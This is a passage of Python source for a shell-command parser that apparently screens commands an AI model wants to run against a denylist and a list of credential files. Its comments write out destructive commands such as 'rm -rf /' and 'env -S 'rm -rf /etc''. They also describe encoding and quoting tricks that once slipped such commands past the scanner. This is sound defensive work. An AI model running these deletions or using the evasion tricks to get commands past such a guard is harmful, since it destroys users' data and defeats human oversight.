    "_ed25519",
    "_ecdsa",
    ".ppk",
    ".key",
    "_key",
)

#: Files that are credentials by name, with no suffix to match on.
#:
#: ``/etc/shadow`` and ``/etc/gshadow`` hold password hashes; ``.netrc`` and
#: ``.git-credentials`` hold passwords in plain text by format. None of them live in a
#: :data:`SECRET_DIRECTORIES` directory -- ``/etc/ssh`` is not dotted either -- so
#: nothing was looking at them.
#:
#: ``.kube/config``, ``.docker/config.json``, ``.npmrc`` and ``.pypirc`` are left out on
#: purpose: people read those as ordinary work, and the rule here is an unconditional
#: refusal rather than a prompt, which is too strong for a file someone legitimately
#: cats. They want an ask-level rule, which is a separate decision.
SECRET_FILES: frozenset[str] = frozenset({".netrc", ".git-credentials"})

#: Credentials that are only credentials where they live.
#:
#: ``shadow`` and ``gshadow`` hold password hashes at ``/etc`` and are an ordinary
#: filename anywhere else -- matching them by name refused a project file called
#: ``shadow``, which is a plain false positive. ``.netrc`` and ``.git-credentials``
#: stay matched by name above, because tools read those from the home directory and
#: from the working directory alike, so they are credentials wherever they sit.
SECRET_PATHS: frozenset[str] = frozenset({"/etc/shadow", "/etc/gshadow"})


def _looks_like_path(word: str) -> bool:
    if not word or word.startswith("-"):
        return False
    if word.startswith(("/", "~", "./", "../", "$HOME", "${HOME}")):
        return True
    # The credential names come from the shared list rather than a copy of some of it.
    # A private three-entry copy lived here, and a word only reaches the credential check
    # if this test already believes it is a path -- so `mv id_rsa x` was refused while
    # `mv id_ecdsa x` and `mv tls.key x` were allowed, the same key by another name.
    #
    # `.env` needs no entry: it is caught by the leading dot on the line below.
    return (
        "/" in word or word.startswith(".") or word.endswith(KEY_SUFFIXES) or word in SECRET_FILES
    )


# --------------------------------------------------------------------------- #
# Lexer
# --------------------------------------------------------------------------- #


@dataclass(slots=True)
class _Word:
    """A shell word. Mutable during lexing only; never escapes this module."""

    raw: str
    value: str
    subs: tuple[str, ...]
    start: int
    end: int


@dataclass(slots=True)
class _Op:
    text: str
    start: int
    end: int


@dataclass(slots=True)
class _Redir:
    operator: str
    target: _Word
    start: int
    end: int


@dataclass(slots=True)
class _Here:
    delimiter: str
    strip: bool
    body: str = ""


@dataclass(slots=True)
class _HereRef:
    """Marks where a heredoc was introduced so the right segment owns its body.

    The body is filled in later (at the next newline), and this holds the *same*
    ``_Here`` object the lexer fills, so grouping does not need to run afterwards.
    """

    here: _Here
    start: int
    end: int


_Item = _Word | _Op | _Redir | _HereRef


#: The escapes ``$'...'`` gives a single character. ``\e``/``\E`` are bash extensions.
_ANSI_C_SIMPLE = {
    "a": "\a",
    "b": "\b",
    "e": "\x1b",
    "E": "\x1b",
    "f": "\f",
    "n": "\n",
    "r": "\r",
    "t": "\t",
    "v": "\v",
    "\\": "\\",
    "'": "'",
    '"': '"',
    "?": "?",
}


def _take(text: str, start: int, limit: int, allowed: str) -> str:
    """At most ``limit`` characters from ``start`` while they are in ``allowed``."""
    end = start
    while end < len(text) and end - start < limit and text[end] in allowed:
        end += 1
    return text[start:end]


def _decode_ansi_c(inner: str) -> str:
    """The bytes ``$'inner'`` actually produces.

    ANSI-C quoting is the one shell construct that can spell a word in characters
    that do not appear in it: ``$'\\x72\\x6d'`` *is* ``rm``, and ``$'\\x2d\\x72\\x66'``
    *is* ``-rf``. Left undecoded, a scanner reading argv sees neither — which is how
    ``rm $'\\x2d\\x72\\x66' /`` reached the model with no hazard at all while bash read
    it as a recursive delete of ``/``.

    An unrecognised escape keeps its backslash, which is what bash does: ``$'\\q'``
    is two characters. ``\\cX`` (control characters) is deliberately left in that
    bucket — it cannot spell a program name or a flag, which is what this decoding
    exists to expose.
    """
    out: list[str] = []
    index = 0
    while index < len(inner):
        char = inner[index]
        if char != "\\" or index + 1 >= len(inner):
            out.append(char)
            index += 1
            continue
        nxt = inner[index + 1]
        if nxt in _ANSI_C_SIMPLE:
            out.append(_ANSI_C_SIMPLE[nxt])
            index += 2
            continue
        if nxt == "x" and (digits := _take(inner, index + 2, 2, string.hexdigits)):
            out.append(chr(int(digits, 16)))
            index += 2 + len(digits)
            continue
        if nxt in "01234567":
            digits = _take(inner, index + 1, 3, "01234567")
            # Masked rather than refused: bash wraps, and a parser that raised here
            # would turn a malformed command into a crash instead of a verdict.
            out.append(chr(int(digits, 8) & 0xFF))
            index += 1 + len(digits)
            continue
        if nxt in "uU" and (
            digits := _take(inner, index + 2, 4 if nxt == "u" else 8, string.hexdigits)
        ):
            out.append(chr(int(digits, 16)))
            index += 2 + len(digits)
            continue
        out.append(char)
        index += 1
    return "".join(out)


#: Expansion operators whose word bash evaluates to *produce a value*.
#:
#: The distinction matters only inside double quotes, and it is the whole of this
#: rule. `"${x:-'$(rm -rf /)'}"` runs the delete: a `'` in a value word is an ordinary
#: character there, not a quote, so it hides nothing. In `${x#'$(…)'}`, `${x%'…'}` and
#: `${x:?'…'}` the same apostrophes *do* suppress the expansion and bash runs nothing --
#: every row of this was checked by pointing the command at a throwaway directory and
#: seeing whether it survived.
#:
#: Which of these fires depends on whether the variable happens to be set, which the
#: scanner cannot know. So all of them count: `:-` runs when unset, `:+` when set, and
#: guessing wrong in either direction is a command nobody sees.
_VALUE_OPERATORS: tuple[str, ...] = (":-", ":=", ":+", "-", "=", "+")

#: Single-character parameters that are not names: `${@:-x}`, `${*:-x}`.
_SPECIAL_PARAMS: str = "@*$"


def _value_word(inner: str) -> str | None:
    """The word of a ``${name<op>word}`` body, when bash evaluates it as a value.

    ``None`` for every other shape -- a pattern (``#``, ``%``, ``/``), a case
    conversion, a substring, an error message (``:?``), a length or an indirection.
    Those keep the ordinary reading, in which an apostrophe *is* a quote.
    """
    if inner[:1] in {"#", "!"}:
        return None  # `${#x}` is a length and `${!x}` an indirection: no word at all.
    index = 1 if inner[:1] in _SPECIAL_PARAMS else 0
    while index < len(inner) and (inner[index].isalnum() or inner[index] == "_"):
        index += 1
    rest = inner[index:]
    # Two-character operators first: `:-` must not be read as a bare `-`.
    for operator in _VALUE_OPERATORS:
        if rest.startswith(operator):
            return rest[len(operator) :]
    return None


def _nested_substitutions(inner: str, *, quoted: bool = False) -> tuple[str, ...]:
    """Every command substitution inside a parameter expansion body, at any depth.

    Re-lexes the body rather than pattern-matching it, so a `$(` that is quoted, or a
    `)` that is not the real terminator, is read exactly the way it is read anywhere
    else.

    One flat pass, not a walk down the nesting. Any limit on how deep to look would be
    a bypass with a number attached -- nest one level past it and the substitution goes
    unseen again -- and recursion deep enough to avoid that blows the stack on
    `"${x:-" * 5000`. Flattening has neither property: `${` inside the body is stepped
    over rather than descended into, so a `$( )` at any depth is found in this pass and
    the cost stays linear in the body's length.
    """
    if "$" not in inner and "`" not in inner:
        return ()
    # Inside double quotes a value word's apostrophes are ordinary characters. Reading
    # them as quotes is what let `"${x:-'$(rm -rf /)'}"` through: bash runs the delete,
    # and two apostrophes were enough to hide it completely.
    word = _value_word(inner) if quoted else None
    body, literal_quotes = (word, True) if word is not None else (inner, False)
    found: list[str] = []
    for item in _Lexer(body, flatten_braces=True, literal_quotes=literal_quotes).run():
        if isinstance(item, _Word):
            found.extend(item.subs)
    return tuple(found)


class _Lexer:
    """A character scanner over one command string.

    ``shlex`` gets the quoting right but throws the operator structure away — it has no
    concept of ``&&`` versus a word, and ``shlex.split`` on ``a;b`` yields ``["a;b"]``.
    Since the operator structure *is* the thing this module needs, the scanner is
    written out by hand and quoting is handled inline.
    """

    def __init__(
        self, text: str, flatten_braces: bool = False, literal_quotes: bool = False
    ) -> None:
        self.text = text
        #: Set while scanning the value word of an expansion that sat inside double
        #: quotes, where `'` is a character like any other rather than a quote.
        self._literal_quotes = literal_quotes
        #: Set while `_nested_substitutions` scans an expansion body: `${` is stepped
        #: over instead of consumed whole, so nested bodies are read in the same pass.
        self._flatten_braces = flatten_braces
        self.i = 0
        self.items: list[_Item] = []
        self._pending: list[_Here] = []
        self._start: int | None = None
        self._raw: list[str] = []
        self._value: list[str] = []
        self._subs: list[str] = []

    # -- word accumulation ------------------------------------------------- #

    def _push(self, raw: str, value: str) -> None:
        if self._start is None:
            self._start = self.i
        self._raw.append(raw)
        self._value.append(value)

    def _flush(self) -> _Word | None:
        if self._start is None:
            return None
        word = _Word(
            raw="".join(self._raw),
            value="".join(self._value),
            subs=tuple(self._subs),
            start=self._start,
            end=self.i,
        )
        self._start = None
        self._raw.clear()
        self._value.clear()
        self._subs.clear()
        return word

    def _emit_word(self) -> None:
        word = self._flush()
        if word is not None:
            self.items.append(word)

    # -- quoting and substitution ------------------------------------------ #

    def _peek(self, offset: int) -> str:
        index = self.i + offset
        return self.text[index] if 0 <= index < len(self.text) else ""

    def _escape(self) -> None:
        nxt = self._peek(1)
        if nxt == "\n":
            # Line continuation: the newline is not a separator.
            self.i += 2
            return
        if nxt == "":
            self._push("\\", "\\")
            self.i += 1
            return
        self._push(f"\\{nxt}", nxt)
        self.i += 2

    def _single(self) -> None:
        end = self.text.find("'", self.i + 1)
        inner = self.text[self.i + 1 :] if end == -1 else self.text[self.i + 1 : end]
        self._push(f"'{inner}'" if end != -1 else f"'{inner}", inner)
        self.i = len(self.text) if end == -1 else end + 1

    def _double(self) -> None:
        self._push('"', "")
        self.i += 1
        while self.i < len(self.text):
            ch = self.text[self.i]
            if ch == '"':
                self._push('"', "")
                self.i += 1
                return
            if ch == "\\":
                nxt = self._peek(1)
                if nxt in '"\\$`\n':
                    self._push(f"\\{nxt}", "" if nxt == "\n" else nxt)
                    self.i += 2
                else:
                    self._push(ch, ch)
                    self.i += 1
                continue
            if ch == "`":
                self._backtick()
                continue
            if ch == "$" and self._peek(1) == "(":
                self._dollar_paren()
                continue
            if ch == "$" and self._peek(1) == "{":
                self._brace(quoted=True)
                continue
            self._push(ch, ch)
            self.i += 1

    def _scan_balanced(self, start: int, opener: str, closer: str) -> tuple[str, int]:
        """Inner text of a balanced pair starting at ``start`` (the opener index)."""
        depth = 0
        index = start
        while index < len(self.text):
            ch = self.text[index]
            if ch == "\\":
                index += 2
                continue
            if ch == "'":
                closing = self.text.find("'", index + 1)
                index = len(self.text) if closing == -1 else closing + 1
                continue
            if ch == '"':
                index += 1
                while index < len(self.text) and self.text[index] != '"':
                    index += 2 if self.text[index] == "\\" else 1
                index += 1
                continue
            if ch == opener:
                depth += 1
            elif ch == closer:
                depth -= 1
                if depth == 0:
                    return self.text[start + 1 : index], index + 1
            index += 1
        return self.text[start + 1 :], len(self.text)

    def _dollar_paren(self) -> None:
        inner, end = self._scan_balanced(self.i + 1, "(", ")")
        raw = self.text[self.i : end]
        if self._start is None:
            self._start = self.i
        self._raw.append(raw)
        # The *text* of a substitution is kept in the value so a path check still sees
        # `$HOME`-shaped words; the inner command is returned as its own segment.
        self._value.append(raw)
        self._subs.append(inner)
        self.i = end

    def _backtick(self) -> None:
        index = self.i + 1
        while index < len(self.text):
            if self.text[index] == "\\":
                index += 2
                continue
            if self.text[index] == "`":
                break
            index += 1
        inner = self.text[self.i + 1 : index]
        raw = self.text[self.i : min(index + 1, len(self.text))]
        if self._start is None:
            self._start = self.i
        self._raw.append(raw)
        self._value.append(raw)
        self._subs.append(inner)
        self.i = min(index + 1, len(self.text))

    def _ansi_c(self) -> None:
        """``$'...'`` — ANSI-C quoting, decoded to the characters it stands for.

        Inside these quotes a backslash escapes the next character, ``'`` included, so
        the terminator cannot be found by a plain ``find``.
        """
        index = self.i + 2
        chunks: list[str] = []
        while index < len(self.text):
            char = self.text[index]
            if char == "\\" and index + 1 < len(self.text):
                chunks.append(self.text[index : index + 2])
                index += 2
                continue
            if char == "'":
                index += 1
                break
            chunks.append(char)
            index += 1
        raw = self.text[self.i : index]
        self._push(raw, _decode_ansi_c("".join(chunks)))
        self.i = index

    def _locale_double(self) -> None:
        """``$"..."`` — a translated string, which lexes as an ordinary double-quoted one.

        The translation is a lookup in a message catalogue. With none installed bash
        yields the contents unchanged, and a safety parser must read the word the way
        the shell will run it on *this* machine rather than on a hypothetical localised
        one — where, in any case, a catalogue that renamed a program name would be a
        far larger problem than this parser.
        """
        self._push("$", "")
        self.i += 1
        self._double()

    def _brace(self, *, quoted: bool = False) -> None:
        if self._flatten_braces:
            self._push("${", "${")
            self.i += 2
            return
        inner, end = self._scan_balanced(self.i + 1, "{", "}")
        raw = self.text[self.i : end]
        self._push(raw, raw)
        # A parameter expansion body can *run* a command: bash evaluates the word in
        # `${x:-$(rm -rf /)}` to produce the default, and the same holds for `:=`,
        # `:+`, `?` and the `#`/`%` trim forms. Hoisting those substitutions is what
        # keeps them visible; without it the only binary this segment reports is the
        # outer one, and every rule that keys on `rm` looks straight past it.
        self._subs.extend(_nested_substitutions(inner, quoted=quoted))
        self.i = end

    # -- operators, redirects, heredocs ------------------------------------- #

    def _operator_at(self, index: int) -> str | None:
        for token in _OPERATOR_TOKENS:
            if self.text.startswith(token, index):
                return token
        return None

    def _char(self, index: int) -> str:
        return self.text[index] if 0 <= index < len(self.text) else ""

    def _redirect_at(self, index: int) -> bool:
        ch = self._char(index)
        if ch and ch in "<>":
            return True
        nxt = self._char(index + 1)
        return ch == "&" and bool(nxt) and nxt in "<>"

    def _is_terminator(self, index: int) -> bool:
        if index >= len(self.text):
            return True
        if self.text[index] in " \t\r\n":
            return True
        if self._redirect_at(index):
            return True
        return self._operator_at(index) is not None

    def _redirect(self) -> None:
        # A digit run immediately before `>` is a file descriptor, not a word.
        fd = ""
        pending = "".join(self._value)
        if pending and pending.isdigit() and self._start is not None:
            fd = pending
            self._start = None
            self._raw.clear()
            self._value.clear()
            self._subs.clear()
        else:
            self._emit_word()
        start = self.i - len(fd)
        operator = fd
        if self.text[self.i] == "&":
            operator += "&"
            self.i += 1
        while self.i < len(self.text) and self.text[self.i] in "<>":
            operator += self.text[self.i]
            self.i += 1
        # `<<<` is a here-string — one word of data on stdin — not a heredoc. The `<`
        # run above is greedy, so this has to be read off the finished operator rather
        # than by peeking for another `<`: that peek could never fire, and treating
        # `<<<` as `<<` makes the *next line* the heredoc body. A command on that line
        # is then never examined at all, which is a denylist bypass one character wide.
        heredoc = operator.endswith("<<") and not operator.endswith("<<<")
        if heredoc and self._char(self.i) == "-":
            operator += "-"
            self.i += 1
        tail = self._char(self.i)
        if not heredoc and tail and tail in "&|" and operator.endswith((">", "<")):
            operator += tail
            self.i += 1
        while self.i < len(self.text) and self.text[self.i] in " \t":
            self.i += 1
        target = self._read_word()
        if heredoc:
            here = _Here(delimiter=target.value, strip=operator.endswith("-"))
            self._pending.append(here)
            self.items.append(_HereRef(here=here, start=start, end=self.i))
            return
        self.items.append(_Redir(operator=operator, target=target, start=start, end=self.i))

    def _read_word(self) -> _Word:
        while not self._is_terminator(self.i):
            self._step()
        word = self._flush()
        return word if word is not None else _Word("", "", (), self.i, self.i)

    def _newline(self) -> None:
        self._emit_word()
        if self._pending:
            self._consume_heredocs()
            return
        self.items.append(_Op("\n", self.i, self.i + 1))
        self.i += 1

    def _consume_heredocs(self) -> None:
        """Swallow every pending heredoc body, keeping the text for the caller.

        The body is data as far as the shell grammar is concerned, so it must not be
        lexed as commands — but ``bash <<EOF`` makes it commands again, which is why
        the body is handed back rather than dropped.
        """
        cursor = self.i + 1
        for here in self._pending:
            lines: list[str] = []
            while cursor < len(self.text):
                newline = self.text.find("\n", cursor)
                line = self.text[cursor:] if newline == -1 else self.text[cursor:newline]
                cursor = len(self.text) if newline == -1 else newline + 1
                probe = line.lstrip("\t") if here.strip else line
                if probe.strip() == here.delimiter:
                    break
                lines.append(line)
            here.body = "\n".join(lines)
        self._pending.clear()
        self.items.append(_Op("\n", self.i, self.i + 1))
        self.i = cursor

    # -- driver ------------------------------------------------------------- #

    def _step(self) -> None:
        ch = self.text[self.i]
        if ch == "\\":
            self._escape()
        elif ch == "'" and not self._literal_quotes:
            self._single()
        elif ch == '"':
            self._double()
        elif ch == "`":
            self._backtick()
        elif ch == "$" and self._peek(1) == "(":
            self._dollar_paren()
        elif ch == "$" and self._peek(1) == "{":
            self._brace()
        elif ch == "$" and self._peek(1) == "'":
            self._ansi_c()
        elif ch == "$" and self._peek(1) == '"':
            self._locale_double()
        else:
            self._push(ch, ch)
            self.i += 1

    def run(self) -> list[_Item]:
        while self.i < len(self.text):
            ch = self.text[self.i]
            if ch == "\n":
                self._newline()
            elif ch in " \t\r":
                self._emit_word()
                self.i += 1
            elif self._redirect_at(self.i):
                self._redirect()
            elif (op := self._operator_at(self.i)) is not None:
                self._emit_word()
                self.items.append(_Op(op, self.i, self.i + len(op)))
                self.i += len(op)
            else:
                self._step()
        self._emit_word()
        # An unterminated heredoc simply has an empty body; nothing else is lost.
        self._pending.clear()
        return self.items


# --------------------------------------------------------------------------- #
# Resolution
# --------------------------------------------------------------------------- #


def resolve_binary(
    words: Sequence[str],
) -> tuple[str, tuple[str, ...], tuple[str, ...], tuple[tuple[str, str], ...]]:
    """``(binary, argv, prefixes, assignments)`` for one segment's words.

    Peels leading ``VAR=value`` assignments and wrapper programs until a real program
    name is left. Returns ``("", (), ...)`` when there is nothing but assignments —
    ``FOO=bar`` on its own runs no program and must not be reported as one.
    """
    prefixes: list[str] = []
    assignments: list[tuple[str, str]] = []
    words = list(words)
    index = 0
    while index < len(words):
        word = words[index]
        if _ASSIGNMENT.match(word):
            name, _, value = word.partition("=")
            assignments.append((name, value))
            index += 1
            continue
        name = PurePosixPath(word).name
        if word in SHELL_KEYWORDS:
            # Grammar, not a program: `then` runs nothing, so the next word is the
            # command. No flag-skipping — a reserved word takes no options.
            prefixes.append(word)
            index += 1
            continue
        if name in WRAPPERS:
            prefixes.append(name)
            index += 1
            value_flags = _WRAPPER_VALUE_FLAGS.get(name, frozenset())
            is_operand = _WRAPPER_OPERAND.get(name)
            while index < len(words):
                candidate = words[index]
                if _ASSIGNMENT.match(candidate) and name in {"env", "sudo", "doas"}:
                    key, _, val = candidate.partition("=")
                    assignments.append((key, val))
                    index += 1
                    continue
                if candidate == "--":
                    index += 1
                    break
                after = words[index + 1] if index + 1 < len(words) else None
                if name == "env" and (split := _split_string(candidate, after)) is not None:
                    line, taken = split
                    words[index : index + taken] = _shell_words(line)
                    continue
                if candidate.startswith("-") and candidate != "-":
                    index += 1
                    if candidate in value_flags and index < len(words):
                        index += 1
                    continue
                if is_operand is not None and is_operand(candidate):
                    is_operand = None
                    index += 1
                    continue
                break
            continue
        break
    argv = tuple(words[index:])
    binary = PurePosixPath(argv[0]).name if argv else ""
    return binary, argv, tuple(prefixes), tuple(assignments)


def _is_duration(word: str) -> bool:
    return bool(re.fullmatch(r"\d+(\.\d+)?[smhd]?", word))


#: ``env`` short options that take the rest of the cluster as their own value, so a
#: later ``S`` in the same cluster is that value's text and not a flag. Measured:
#: ``env -uS'rm -f x'`` unsets a variable named ``S'rm -f x'`` and deletes nothing.
_ENV_CLUSTER_STOPS: str = "uC"


def _split_string(word: str, following: str | None) -> tuple[str, int] | None:
    """``env``'s ``-S`` command line and the number of words it occupies, or ``None``.

    ``-S`` is not a setting. GNU ``env`` splits its value and *runs* it, so
    ``env -S 'rm -rf /etc'`` is a delete wearing one extra word. Skipping the value
    the way ``-u NAME`` is skipped left nothing behind to scan: the whole command
    resolved to the empty string and every check downstream had no binary to object
    to.

    All the spellings ``env`` accepts, each one measured against coreutils 9.4:
    ``-S LINE``, ``-SLINE``, ``--split-string=LINE``, ``--split-string LINE``, and
    ``S`` last in a short cluster such as ``-iS'…'``.
    """
    if word in {"-S", "--split-string"}:
        return (following, 2) if following is not None else None
    if word.startswith("--split-string="):
        return word[len("--split-string=") :], 1
    if not word.startswith("-") or word.startswith("--"):
        return None
    for offset, letter in enumerate(word[1:], start=1):
        if letter in _ENV_CLUSTER_STOPS:
            return None
        if letter == "S":
            return word[offset + 1 :], 1
    return None


def _shell_words(line: str) -> list[str]:
    """``line`` split the way ``env -S`` splits it.

    Close enough on purpose: ``shlex`` honours the quotes and backslashes ``-S`` does,
    and where it disagrees -- ``${VAR}``, which ``env`` expands and ``shlex`` leaves
    alone -- the literal is what gets scanned, which is the cautious direction. An
    unbalanced quote is a string ``shlex`` refuses to split at all, and refusing would
    hide the words, so those fall back to whitespace.
    """
    try:
        return shlex.split(line)
    except ValueError:
        return line.split()


@dataclass(slots=True)
class _Group:
    """One command's worth of lexer items, before it becomes a Segment."""

    words: list[_Word] = field(default_factory=list)
    redirects: list[_Redir] = field(default_factory=list)
    heredocs: list[_Here] = field(default_factory=list)
    connector: str = ""
    terminator: str = ""
    start: int = 0
    end: int = 0


def _group_items(items: Sequence[_Item]) -> list[_Group]:
    groups: list[_Group] = []
    current = _Group()
    started = False
    for item in items:
        if isinstance(item, _Op):
            if started:
                current.terminator = _CONNECTOR.get(item.text, item.text)
                groups.append(current)
            current = _Group(connector=_CONNECTOR.get(item.text, item.text))
            started = False
            continue
        if not started:
            current.start = item.start
            started = True
        current.end = item.end
        if isinstance(item, _Word):
            current.words.append(item)
        elif isinstance(item, _Redir):
            current.redirects.append(item)
        else:
            current.heredocs.append(item.here)
    if started:
        groups.append(current)
    return groups


def _exec_payloads(argv: Sequence[str], flags: frozenset[str]) -> tuple[str, ...]:
    """Each command introduced by one of ``flags``, in the order they appear.

    A clause runs from the word after the flag to the next ``;`` or ``+``. One argv can
    hold several (`find . -exec a \\; -exec b \\;`), and the last one may be
    unterminated if the command was truncated -- taking it anyway is the safer read,
    since the alternative is to say nothing about a command that is plainly there.
    """
    found: list[str] = []
    index = 0
    while index < len(argv):
        if argv[index] not in flags:
            index += 1
            continue
        index += 1
        start = index
        while index < len(argv) and argv[index] not in _EXEC_TERMINATORS:
            index += 1
        if index > start:
            found.append(_rejoin(argv[start:index]))
    return tuple(found)


def _rejoin(words: Sequence[str]) -> str:
    """Put argv words back together as a command line, keeping what the quotes did.

    A plain ``" ".join`` loses them, and losing them changes the command: the words of
    ``find . -exec sh -c 'rm -rf /etc' \\;`` are ``["sh", "-c", "rm -rf /etc"]``, and
    joined bare they re-parse as ``sh -c rm`` with ``-rf`` and ``/etc`` as stray
    arguments to ``sh``. The delete became the single word ``rm`` and the denylist saw
    nothing to refuse.
    """
    return " ".join(shlex.quote(word) for word in words)


def _subcommand_payload(argv: Sequence[str], phrase: Sequence[str]) -> str | None:
    """Everything after ``phrase``, as one command, or ``None`` if it is not there.

    The phrase has to match in order and immediately after the binary, so a file called
    ``foreach`` passed to some other subcommand is not mistaken for one of these.
    """
    words = argv[1:]
    if len(words) <= len(phrase) or tuple(words[: len(phrase)]) != tuple(phrase):
        return None
    rest = list(words[len(phrase) :])
    # Only the *leading* options belong to the phrase. Dropping every option word
    # would eat the inner command's own flags, and `rm /etc` is not `rm -rf /etc`:
    # the hazard scanner keys on `-r`, so the delete would go quiet again.
    while rest and rest[0].startswith("-"):
        rest.pop(0)
    if not rest:
        return None
    # One word left means the shell already collapsed the quotes around a whole command
    # line -- `git submodule foreach 'rm -rf /etc'` -- and it is used as written.
    # Several words are an argv, and joining those needs the quoting put back, or
    # `sh -c 'rm -rf /etc'` re-parses as `sh -c rm` with two stray arguments.
    return rest[0] if len(rest) == 1 else _rejoin(rest)


#: The whole of awk's vocabulary for running a command. Enumerated against the real
#: program rather than guessed, and it is closed by the language rather than by taste:
#:
#: * ``system("cmd")`` -- also ``system(variable)`` and ``system ("cmd")`` with a space
#: * ``print … | "cmd"`` -- an output pipe
#: * ``"cmd" | getline`` -- an input pipe
#: * ``|&`` -- gawk's co-process
#:
#: Every one needs the token ``system`` or a ``|``. There is no way around them: awk has
#: no ``eval``, and ``@`` indirection reaches user functions, not builtins -- measured,
#: ``@c("rm -f x")`` with ``c="sys" "tem"`` runs nothing. ``|`` has no other meaning
#: inside an awk program; POSIX awk has no bitwise-or operator and gawk spells it
#: ``or()``.
#:
#: ``print > "file"`` writes a file without running anything, and is a gap in what a
#: caller can see rather than one this closes.
_AWK_SHELL_TOKENS: tuple[str, ...] = ("system", "|")


def _reaches_a_shell(program: str) -> bool:
    """Whether an awk program has any way to run a command.

    The alternative was to hand *every* awk program to the scanner. Measured, that
    costs more than it buys: ``awk '{print $1}' access.log`` flattens to a segment
    named ``{print``, and an allow rule reading ``^awk `` then stops covering the
    command it was written for, because a segment nobody wrote does not match it. A
    safety check that makes ``awk '{print $1}'`` prompt is a check that gets switched
    off, and an off check catches nothing.
    """
    return any(token in program for token in _AWK_SHELL_TOKENS)


def _sed_field(script: str, index: int, delimiter: str) -> tuple[str, int]:
    """One delimiter-terminated field of a ``s`` or ``y`` command, and where it ends."""
    out: list[str] = []
    while index < len(script):
        char = script[index]
        if char == "\\" and index + 1 < len(script):
            out.append(script[index : index + 2])
            index += 2
            continue
        if char == delimiter:
            return "".join(out), index + 1
        out.append(char)
        index += 1
    return "".join(out), index


def _sed_address(script: str, index: int) -> int:
    """Past any address in front of a command: ``12``, ``$``, ``/re/``, ``\\%re%``."""
    while index < len(script):
        char = script[index]
        if char.isdigit() or char in "$,~+":
            index += 1
            continue
        if char in "/\\":
            delimiter = "/" if char == "/" else script[index + 1 : index + 2] or "/"
            _, index = _sed_field(script, index + 1 if char == "/" else index + 2, delimiter)
            while index < len(script) and script[index] in "IM":
                index += 1
            continue
        break
    return index


def _sed_commands(script: str) -> tuple[str, ...]:
    """Every command ``script`` hands to a shell.

    The script is walked rather than searched. Searching for an ``e`` finds the one in
    ``s/x/y/w notes-e.txt``, in ``/error/d`` and in ``:e;n;be``, none of which run
    anything -- and a check that refuses those is a check that gets turned off.
    """
    found: list[str] = []
    index = 0
    while index < len(script):
        char = script[index]
        if char in " \t\n;{}!":
            index += 1
            continue
        if char == "#":
            index = _sed_end_of_line(script, index)
            continue
        index = _sed_address(script, index)
        while index < len(script) and script[index] in " \t!":
            index += 1
        if index >= len(script):
            break
        letter = script[index]
        index += 1
        if letter in "sy":
            if index >= len(script):
                break
            delimiter = script[index]
            _, index = _sed_field(script, index + 1, delimiter)
            replacement, index = _sed_field(script, index, delimiter)
            index, executes = _sed_flags(script, index)
            if executes and replacement:
                found.append(replacement.replace(f"\\{delimiter}", delimiter))
            continue
        if letter == "e":
            break_at = script.find("\n", index)
            stop = len(script) if break_at < 0 else break_at
            command = script[index:stop].strip()
            if command:
                found.append(command)
            index = stop + 1
            continue
        if letter in _SED_LINE_ARGUMENT:
            index = _sed_end_of_line(script, index)
            continue
        while letter in _SED_NO_ARGUMENT and index < len(script) and script[index].isdigit():
            index += 1
    return tuple(found)


def _sed_end_of_line(script: str, index: int) -> int:
    end = script.find("\n", index)
    return len(script) if end < 0 else end + 1


def _sed_flags(script: str, index: int) -> tuple[int, bool]:
    """Past a substitution's flags, and whether ``e`` was among them."""
    executes = False
    while index < len(script):
        flag = script[index]
        if flag == "e":
            executes = True
            index += 1
            continue
        if flag in _SED_SUBSTITUTION_FLAGS:
            index += 1
            continue
        # Anything else ends the flags. `w` ends them too, and the filename after it
        # is then consumed by the line-argument branch in the caller -- which is what
        # keeps the `e` in `s/x/y/w notes-e.txt` from being read as a flag.
        break
    return index, executes


def _program_argument(argv: Sequence[str], value_flags: frozenset[str]) -> str | None:
    """The program text an interpreter takes as its first operand, or ``None``.

    ``awk -F, -v n=1 'BEGIN{system("rm -rf /etc")}' data.csv`` has to skip two options
    and one option value before the program, and stop before the data file. Returning
    the wrong word here is worse than returning nothing: a data filename read as a
    program reports a command that never runs.
    """
    index = 1
    while index < len(argv):
        word = argv[index]
        if word == "--":
            index += 1
            break
        if not word.startswith("-") or word == "-":
            break
        for flag in _PROGRAM_ELSEWHERE:
            # `-fprog.awk` attaches, `--file=prog.awk` attaches with `=`, and both
            # spellings mean the operand is data.
            if (
                word == flag
                or word.startswith(f"{flag}=")
                or (len(flag) == 2 and word.startswith(flag))
            ):
                return None
        index += 2 if word in value_flags else 1
    return argv[index] if index < len(argv) else None


def _payloads_after(argv: Sequence[str], flags: Sequence[str]) -> tuple[str, ...]:
    """Every value given for ``flags``, not just the first.

    ``sed -e 's/q/z/' -e 's/x/rm -rf \\/etc/e'`` is one command with two scripts, and
    the dangerous one is the second.
    """
    found: list[str] = []
    for position, word in enumerate(argv):
        for flag in flags:
            if word == flag and position + 1 < len(argv):
                found.append(argv[position + 1])
            elif word.startswith(f"{flag}="):
                found.append(word[len(flag) + 1 :])
    return tuple(found)


def _payload_after(argv: Sequence[str], flags: Sequence[str]) -> str | None:
    """The word a command-carrying flag takes, whichever way the flag is spelled.

    Matching only the exact word missed two spellings that all run, measured against
    the real programs:

    * bundled into a short cluster -- ``bash -lc 'rm -rf /'``, ``sh -xc '…'``,
      ``script -qc '…'``, ``perl -we '…'``, ``python3 -uc '…'``. The letter does not
      have to be last: ``bash -cv 'rm -rf /'`` runs the line too.
    * attached to a long option -- ``script --command='rm -rf /'``.

    Short letters are only read out of a genuine cluster (one dash), never out of a
    long option, or ``--concurrency`` would look like a ``-c``.
    """
    letters = {flag[1] for flag in flags if len(flag) == 2 and flag.startswith("-")}
    longs = tuple(flag for flag in flags if flag.startswith("--"))
    for index, word in enumerate(argv):
        for long in longs:
            if word.startswith(f"{long}="):
                return word[len(long) + 1 :]
        if index + 1 >= len(argv):
            continue
        if word in flags:
            return argv[index + 1]
        if word.startswith("-") and not word.startswith("--") and letters & set(word[1:]):
            return argv[index + 1]
    return None


def parse_command(raw: str) -> tuple[Segment, ...]:
    """Every program ``raw`` would run, as a flat sequence of segments.

    Top-level segments come first in source order; a nested segment follows the segment
    it was found in and carries ``depth > 0`` plus a ``parent`` index into the returned
    tuple. Flat rather than a tree because every caller wants the same thing — *judge
    all of them* — and a tree makes it possible to forget a branch.
    """
    out: list[Segment] = []
    _parse_into(raw, out, depth=0, parent=None, origin=Origin.TOP)
    return tuple(out)


def _parse_into(
    text: str, out: list[Segment], *, depth: int, parent: int | None, origin: Origin
) -> None:
    if depth > _MAX_DEPTH or not text.strip():
        return
